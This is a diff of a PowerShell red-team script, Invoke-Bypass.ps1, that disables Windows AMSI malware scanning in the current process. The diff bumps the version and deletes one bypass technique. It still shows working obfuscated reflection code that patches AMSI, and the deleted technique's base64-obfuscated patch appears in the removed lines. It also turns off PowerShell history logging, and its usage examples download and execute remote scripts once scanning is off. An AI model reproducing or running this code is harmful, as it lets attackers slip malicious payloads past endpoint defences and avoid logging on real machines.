@@ -6,7 +6,7 @@
    Tested Under: Windows 10 (19044) x64 bits
    Required Dependencies: Assembly {native}
    Optional Dependencies: IWR {native}
-   PS cmdlet Dev version: v1.1.12
+   PS cmdlet Dev version: v1.1.13
 
 .DESCRIPTION
    This cmdlet attempts to disable AMS1 string scanning within
@@ -53,7 +53,7 @@
    Bypass ams1 detection on current proccess and execute evil.ps1 with arguments (parameters)
 
 .EXAMPLE
-   PS C:\> .\Invoke-Bypass.ps1 -technic "4" -payloadUrl "https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/bin/sysinfo.ps1" -fileargs "-sysinfo enum"
+   PS C:\> .\Invoke-Bypass.ps1 -technic "2" -payloadUrl "https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/bin/sysinfo.ps1" -fileargs "-sysinfo enum"
    Bypass ams1 detection on current proccess and download\execute sysinfo.ps1 with arguments ( -sysinfo enum )
 
 .EXAMPLE
@@ -92,7 +92,7 @@
 )
 
 
-$cmdletVersion = "v1.1.12"
+$cmdletVersion = "v1.1.13"
 #Cmdlet Global variable declarations
 $ErrorActionPreference = "SilentlyContinue"
 #Disable Powershell Command Logging for current session.
@@ -100,7 +100,7 @@ Set-PSReadlineOption HistorySaveStyle SaveNothing|Out-Null
 $host.UI.RawUI.WindowTitle = "@Invoke-Bypass $cmdletVersion"
 Write-Host "`n* Disable AM`S`1 within current process." -ForegroundColor Green
 
-If($Technic -lt 1 -or $Technic -gt 4)
+If($Technic -lt 1 -or $Technic -gt 3)
 {
    [int]$Technic = 2
    write-host "  + " -ForegroundColor DarkYellow -NoNewline;
@@ -126,7 +126,6 @@ If($List -iMatch "^(technic|technics)$")
    write-host "  1        PS`V2_DO`WNGR`ADE"
    write-host "  2        FORC`E_AM`SI_ERROR"
    write-host "  3        AM`SI_UT`ILS_P`AT`CH"
-   write-host "  4        AM`SI_UT`ILS_BAS`E64"
    write-host ""
    write-host "* " -ForegroundColor Green -NoNewline;
    write-host "Syntax examples:" -ForegroundColor DarkGray
@@ -305,27 +304,6 @@ ElseIf($Technic -eq 3)
       $Graphics = [string](0..13|%{[char][int](53+($MsTeamsId).substring(($_*2),2))}) -Replace ' '
       $imgForm = $Drawing.Replace("@","").Replace("+","m");$Bitmap = [Ref].Assembly.GetType($imgForm)
       $i0Stream = $Bitmap.GetField($Graphics,"$ComponentDeviceId,Static");$i0Stream.SetValue($null,[bool]0x12AE)
-   }Catch{Throw $_}
-}
-ElseIf($Technic -eq 4)
-{
-
-   <#
-   .SYNOPSIS
-      Author: @r00t-3xp10it
-      Disclosure: @Unknown
-      Helper - AM`SI_UT`ILS_BAS`E64
-   #>
-
-   $Disclosure = "@Unknown"
-   $TechnicName = "AM`SI_UT`ILS_BAS`E64"
-
-   Try{#Ams1 bypass technic n 4
-      $KernelID = "No@nP" + "@ub@lic" -replace '@',''
-      [Ref].Assembly.GetType($('Syst'+'em.Manag'+'ement.Autom'+'ation.')+$([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('QQBtAHMAaQA=')))+
-      $([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('VQB0AGkAbABzAA==')))).GetField($([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('YQBtAHMAaQA='))+
-      $([System.Text.Encoding]::Unicode.GetString($([System.Convert]::FromBase64String('SQBuAGkAdAA='))))+
-      $([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('RgBhAGkAbABlAGQA')))),$("$KernelID,Static")).SetValue($null,[bool]0x12AE)
    }Catch{Throw $_}
 }
 
